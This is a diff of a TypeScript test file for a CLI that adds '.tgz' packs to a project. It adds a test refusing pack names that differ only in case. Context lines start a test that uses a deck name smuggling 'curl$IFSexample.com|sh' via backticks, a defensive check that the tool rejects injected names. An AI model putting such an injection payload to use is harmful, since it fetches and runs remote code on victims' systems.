@@ -248,6 +248,29 @@ describe("dekc ref <file>.tgz", () => {
   );
 
   test.serial(
+    "refuses a pack whose name differs from a pinned one's only in case, which shares its folders",
+    async () => {
+      await withTempDir(async (inbox) => {
+        const upper = await packOf(inbox, { ...talk, name: "Talk" }, "Talk.tgz");
+        const other = { ...talk, script: "---\ntitle: Another\n---\n\n## intro\n\nhi\n" };
+        const lower = await packOf(inbox, other, "lower.tgz");
+        await withTempProject(receiver, async (root) => {
+          await addRef(root, upper);
+          const toml = await readFile(join(root, "dek.toml"), "utf8");
+          await expect(addRef(root, lower)).rejects.toMatchObject({
+            message: "file/talk would share its folders with file/Talk, which dek.toml pins",
+            hint: expect.stringContaining("`dekc ref rm file/Talk`"),
+          });
+          expect(await readFile(join(root, "dek.toml"), "utf8")).toBe(toml);
+          expect(await Bun.file(join(root, "packs", "Talk.tgz")).bytes()).toEqual(
+            await Bun.file(upper).bytes(),
+          );
+        });
+      });
+    },
+  );
+
+  test.serial(
     "refuses a pack whose deck a ref cannot name, without printing the name",
     async () => {
       const name = "x`;curl$IFSexample.com|sh;`";
